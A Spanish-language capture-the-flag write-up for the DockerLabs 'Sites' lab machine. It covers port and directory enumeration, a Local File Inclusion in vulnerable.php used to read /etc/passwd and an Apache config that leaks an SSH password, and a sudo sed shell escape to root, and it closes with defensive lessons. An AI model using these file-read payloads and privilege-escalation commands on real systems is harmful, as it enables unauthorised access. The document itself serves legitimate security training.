# Sites — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟡 Medio  
**SO:** Linux  
**Autor de la máquina:** El Pingüino de Mario  
**Fecha de creación:** 05/08/2024  
**Técnicas:** Gobuster · Wfuzz · Local File Inclusion · Apache Enumeration · SSH · sudo sed abuse · GTFOBins

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web](#2-enumeración-web)
3. [Enumeración con Wfuzz](#3-enumeración-con-wfuzz)
4. [Obtención de credenciales](#4-obtención-de-credenciales)
5. [Acceso SSH](#5-acceso-ssh)
6. [Escalada de privilegios](#6-escalada-de-privilegios)
7. [Lección aprendida](#7-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh sites.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo profundo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
22/tcp open ssh
80/tcp open http
```

Servicios detectados:

```text
Apache httpd
OpenSSH
```

---

## 2. Enumeración web

Accedemos al servidor web:

```text
http://172.17.0.2
```

La página muestra información relacionada con:

```text
Configuración de Apache y Seguridad
```

Información relevante encontrada:

```text
sites-available
sitio.conf
```

Enumeramos directorios ocultos:

```bash
gobuster dir -u http://172.17.0.2 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-x php,html,py,txt -t 100
```

Resultado:

```text
/index.html
/vulnerable.php
/server-status
```

Exploramos:

```text
http://172.17.0.2/vulnerable.php
```

La aplicación solicita:

```text
Please provide a page or a username.
```

La funcionalidad parece vulnerable a inclusión de archivos.

---

## 3. Enumeración con Wfuzz

Realizamos un fuzzing inicial:

```bash
wfuzz -c \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
"http://172.17.0.2/vulnerable.php?FUZZ=index"
```

Posteriormente aplicamos filtros para eliminar respuestas irrelevantes:

```bash
wfuzz -c --hh 0 \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
"http://172.17.0.2/vulnerable.php?FUZZ=index"
```

Resultado relevante:

```text
page
```

Probamos el parámetro vulnerable:

```text
http://172.17.0.2/vulnerable.php?page=/etc/passwd
```

Resultado:

```text
chocolate:x:1000:1000::/home/chocolate:/bin/bash
```

Descubrimos un usuario válido:

```text
chocolate
```

---

## 4. Obtención de credenciales

Recordando la información inicial relacionada con Apache:

```text
sites-available
sitio.conf
```

Intentamos leer el archivo de configuración:

```text
http://172.17.0.2/vulnerable.php?page=/etc/apache2/sites-available/sitio.conf
```

Resultado relevante:

```text
La contraseña de chocolate es:
tarta
```

Obtenemos credenciales válidas:

```text
Usuario: chocolate
Contraseña: tarta
```

---

## 5. Acceso SSH

Accedemos mediante SSH:

```bash
ssh chocolate@172.17.0.2
```

Contraseña:

```text
tarta
```

Acceso correcto.

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /usr/bin/sed
```

---

## 6. Escalada de privilegios

Consultamos GTFOBins para `sed`.

Payload utilizado:

```bash
sudo /usr/bin/sed -n '1e exec sh 1>&0' /etc/hosts
```

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 7. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Información sensible expuesta | Descubrimiento de rutas críticas |
| Local File Inclusion | Lectura arbitraria de archivos |
| Configuración Apache accesible | Filtración de credenciales |
| Contraseña débil SSH | Acceso inicial |
| sudo sobre sed | Escalada inmediata a root |

**Para defenderse:**

- Validar correctamente parámetros de inclusión.
- Restringir acceso a archivos sensibles del sistema.
- No almacenar contraseñas en configuraciones accesibles.
- Aplicar políticas robustas de contraseñas.
- Limitar binarios peligrosos mediante sudo.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
